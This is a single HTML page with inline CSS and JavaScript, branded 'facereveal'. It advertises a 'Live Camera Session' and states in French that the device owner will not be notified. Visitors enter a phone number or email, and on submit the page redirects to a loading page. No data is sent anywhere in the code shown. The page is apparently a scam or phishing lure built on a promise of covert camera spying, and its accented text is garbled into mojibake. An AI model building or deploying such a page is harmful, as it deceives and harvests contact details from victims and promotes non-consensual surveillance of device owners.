
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>facereveal â€” Join</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
  <style>
    :root{
      --bg:#0e0f12; --panel:#1a1c21; --panel-2:#23262d;
      --txt:#edf2f7; --muted:#9aa3b2; --accent:#3b82f6;
      --ring:rgba(59,130,246,.35); --radius:16px;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0; background:var(--bg); color:var(--txt); font:16px/1.4 Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
      display:flex; flex-direction:column;
    }
    header{padding:20px}
    header .brand{font-weight:800; letter-spacing:.2px; font-size:22px}
    main{flex:1; display:grid; place-items:center; padding:24px}
    .card{
      width:min(560px, 92vw);
      padding:36px 28px 28px;
      background:linear-gradient(180deg, rgba(255,255,255,.04), rgba(255,255,255,.02)) ;
      border:1px solid rgba(255,255,255,.08);
      border-radius:24px;
      box-shadow:0 20px 70px rgba(0,0,0,.45), inset 0 0 0 1px rgba(255,255,255,.03);
      text-align:center;
    }
    .badge{
      width:72px; height:72px; display:grid; place-items:center; margin:10px auto 18px;
      border-radius:999px; background:#22252c; border:1px solid rgba(255,255,255,.08);
    }
    .badge svg{width:34px; height:34px; opacity:.9}
    h1{margin:4px 0 8px; font-size:28px; letter-spacing:.2px}
    p.sub{margin:0 0 22px; color:var(--muted)}
    .toggle{
      display:flex; gap:12px; justify-content:center; margin:4px 0 18px;
    }
    .chip{
      display:inline-flex; align-items:center; gap:8px;
      background:var(--panel); border:1px solid rgba(255,255,255,.08);
      padding:10px 16px; border-radius:999px; color:var(--txt); cursor:pointer; user-select:none;
      transition:transform .06s ease, border-color .2s ease, background .2s ease;
    }
    .chip[aria-pressed="true"]{
      background:var(--panel-2);
      border-color:var(--ring);
      box-shadow:0 0 0 6px var(--ring);
    }
    .chip svg{width:18px; height:18px; opacity:.9}
    form{display:grid; gap:14px; margin-top:10px}
    .row{display:grid; gap:10px}
    .select, .input{
      background:#121419; border:1px solid rgba(255,255,255,.12);
      border-radius:12px; color:var(--txt); padding:14px 14px; text-align:left;
    }
    .select{display:flex; align-items:center; gap:10px; justify-content:space-between}
    .select .left{display:flex; align-items:center; gap:10px; opacity:.95}
    .flag{font-size:18px}
    .chev{opacity:.6}
    input{
      all:unset; color:var(--txt); width:100%;
    }
    .btn{
      margin-top:6px; border:1px solid rgba(255,255,255,.12);
      background:#2a2f39; color:#dbe7ff; padding:14px 16px; border-radius:12px; font-weight:600;
      cursor:not-allowed; opacity:.55; transition:transform .06s ease, box-shadow .2s ease, opacity .2s ease;
    }
    .btn[aria-disabled="false"]{
      cursor:pointer; opacity:1; background:#2b66f6; border-color:#2b66f6;
      box-shadow:0 0 0 6px var(--ring);
    }
    .btn:active{transform:translateY(1px)}
    footer{padding:26px 16px 30px; text-align:center}
    footer a{color:#7aa7ff; text-decoration:none}
    .helper{font-size:13px; color:var(--muted); margin-top:10px}
  </style>
</head>
<body>
  <header>
  <div class="brand">facereveal</div>
  </header>

  <main>
    <section class="card" role="region" aria-labelledby="title">
      <div class="badge" aria-hidden="true">
        <!-- link icon -->
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6">
          <path d="M10 13a5 5 0 0 0 7.07 0l2.83-2.83a5 5 0 0 0-7.07-7.07L10 5"/>
          <path d="M14 11a5 5 0 0 0-7.07 0L4.1 13.83a5 5 0 1 0 7.07 7.07L14 19"/>
        </svg>
      </div>

      <h1 id="title">Live Camera Session</h1>
      <p class="sub">Le propriÃ©taire de l'appareil ne sera pas notifiÃ©.</p>

      <div class="toggle" role="tablist" aria-label="Contact method">
        <button class="chip" id="tab-phone" aria-pressed="true">
          <!-- phone icon -->
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 16.92v2a2 2 0 0 1-2.18 2A19.8 19.8 0 0 1 3.11 4.18 2 2 0 0 1 5.1 2h2a2 2 0 0 1 2 1.72c.12.86.3 1.7.54 2.5a2 2 0 0 1-.45 2.11L8 9a16 16 0 0 0 7 7l.67-1.18a2 2 0 0 1 2.11-.45c.8.24 1.64.42 2.5.54A2 2 0 0 1 22 16.92z"/></svg>
          Phone
        </button>
        <button class="chip" id="tab-email" aria-pressed="false">
          <!-- mail icon -->
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 4h16v16H4z"/><path d="m22 6-10 7L2 6"/></svg>
          Email
        </button>
      </div>

      <form id="form" novalidate>
        <div class="row" id="row-phone">
          <label class="select" aria-label="Country">
            <select id="country" style="background:transparent;border:none;color:inherit;font:inherit;width:100%;outline:none;">
              <option value="us" data-flag="ðŸ‡ºðŸ‡¸" data-code="1">ðŸ‡ºðŸ‡¸ United States (+1)</option>
              <option value="fr" data-flag="ðŸ‡«ðŸ‡·" data-code="33">ðŸ‡«ðŸ‡· France (+33)</option>
              <option value="be" data-flag="ðŸ‡§ðŸ‡ª" data-code="32">ðŸ‡§ðŸ‡ª Belgique (+32)</option>
              <option value="ca" data-flag="ðŸ‡¨ðŸ‡¦" data-code="1">ðŸ‡¨ðŸ‡¦ Canada (+1)</option>
              <option value="ma" data-flag="ðŸ‡²ðŸ‡¦" data-code="212">ðŸ‡²ðŸ‡¦ Maroc (+212)</option>
              <option value="dz" data-flag="ðŸ‡©ðŸ‡¿" data-code="213">ðŸ‡©ðŸ‡¿ AlgÃ©rie (+213)</option>
              <option value="ch" data-flag="ðŸ‡¨ðŸ‡­" data-code="41">ðŸ‡¨ðŸ‡­ Suisse (+41)</option>
              <option value="sn" data-flag="ðŸ‡¸ðŸ‡³" data-code="221">ðŸ‡¸ðŸ‡³ SÃ©nÃ©gal (+221)</option>
              <option value="ci" data-flag="ðŸ‡¨ðŸ‡®" data-code="225">ðŸ‡¨ðŸ‡® CÃ´te d'Ivoire (+225)</option>
              <option value="cm" data-flag="ðŸ‡¨ðŸ‡²" data-code="237">ðŸ‡¨ðŸ‡² Cameroun (+237)</option>
              <option value="tn" data-flag="ðŸ‡¹ðŸ‡³" data-code="216">ðŸ‡¹ðŸ‡³ Tunisie (+216)</option>
              <option value="mg" data-flag="ðŸ‡²ðŸ‡¬" data-code="261">ðŸ‡²ðŸ‡¬ Madagascar (+261)</option>
              <option value="re" data-flag="ðŸ‡·ðŸ‡ª" data-code="262">ðŸ‡·ðŸ‡ª RÃ©union (+262)</option>
              <option value="gp" data-flag="ðŸ‡¬ðŸ‡µ" data-code="590">ðŸ‡¬ðŸ‡µ Guadeloupe (+590)</option>
              <option value="mq" data-flag="ðŸ‡²ðŸ‡¶" data-code="596">ðŸ‡²ðŸ‡¶ Martinique (+596)</option>
              <option value="yt" data-flag="ðŸ‡¾ðŸ‡¹" data-code="262">ðŸ‡¾ðŸ‡¹ Mayotte (+262)</option>
              <option value="gf" data-flag="ðŸ‡¬ðŸ‡«" data-code="594">ðŸ‡¬ðŸ‡« Guyane (+594)</option>
              <option value="pm" data-flag="ðŸ‡µðŸ‡²" data-code="508">ðŸ‡µðŸ‡² Saint-Pierre-et-Miquelon (+508)</option>
              <option value="bl" data-flag="ðŸ‡§ðŸ‡±" data-code="590">ðŸ‡§ðŸ‡± Saint-BarthÃ©lemy (+590)</option>
              <option value="mf" data-flag="ðŸ‡²ðŸ‡«" data-code="590">ðŸ‡²ðŸ‡« Saint-Martin (+590)</option>
            </select>
          </label>
          <label class="input" aria-label="Phone number">
            <input id="phone" inputmode="tel" placeholder="+1 (123) 456-7890" />
          </label>
        </div>

        <div class="row" id="row-email" style="display:none">
          <label class="input" aria-label="Email">
            <input id="email" type="email" placeholder="name@example.com" />
          </label>
        </div>

        <button class="btn" id="continue" aria-disabled="true">Continue</button>
  <!-- helper supprimÃ© -->
      </form>
    </section>
  </main>

  <footer>
    <a href="#" rel="noopener">Privacy Policy</a>
  </footer>

  <script>
    const tabPhone = document.getElementById('tab-phone');
    const tabEmail = document.getElementById('tab-email');
    const rowPhone = document.getElementById('row-phone');
    const rowEmail = document.getElementById('row-email');
    const btn = document.getElementById('continue');
    const phone = document.getElementById('phone');
    const email = document.getElementById('email');

    function setMode(mode){
      const isPhone = mode === 'phone';
      tabPhone.setAttribute('aria-pressed', isPhone);
      tabEmail.setAttribute('aria-pressed', !isPhone);
      rowPhone.style.display = isPhone ? '' : 'none';
      rowEmail.style.display = isPhone ? 'none' : '';
      validate();
    }

    function validate(){
      let ok=false;
      if (rowPhone.style.display !== 'none') {
        // VÃ©rifie qu'il y a au moins 9 chiffres dans le champ tÃ©lÃ©phone
        const digits = (phone.value.match(/\d/g) || []).length;
        ok = digits >= 9;
      } else {
        ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value.trim());
      }
      btn.setAttribute('aria-disabled', !ok);
    }

    tabPhone.addEventListener('click', ()=>setMode('phone'));
    tabEmail.addEventListener('click', ()=>setMode('email'));
    phone.addEventListener('input', validate);
    email.addEventListener('input', validate);

    document.getElementById('form').addEventListener('submit', (e)=>{
      e.preventDefault();
      if (btn.getAttribute('aria-disabled') === 'false') {
        window.location.href = 'chargement tel.html';
      }
    });

    /* -------- Ajout: synchronise lâ€™indicatif avec le pays sÃ©lectionnÃ© -------- */
    const country = document.getElementById('country');

    function applyDialFromSelect(init=false){
      const opt = country.options[country.selectedIndex];
      const dial = opt?.dataset?.code ? `+${opt.dataset.code}` : '';

      if (dial) {
        phone.placeholder = `${dial} (123) 456-7890`;
      }

      const v = phone.value.trim();
      const prefixMatch = v.match(/^\+\d+/);
      if (v === '' || init) {
        phone.value = dial ? (dial + ' ') : v;
      } else if (prefixMatch) {
        phone.value = v.replace(/^\+\d+/, dial);
      }
      validate();
    }

    country.addEventListener('change', ()=>applyDialFromSelect());
    applyDialFromSelect(true);
    /* ------------------------------------------------------------------------ */
  </script>
</body>
</html>
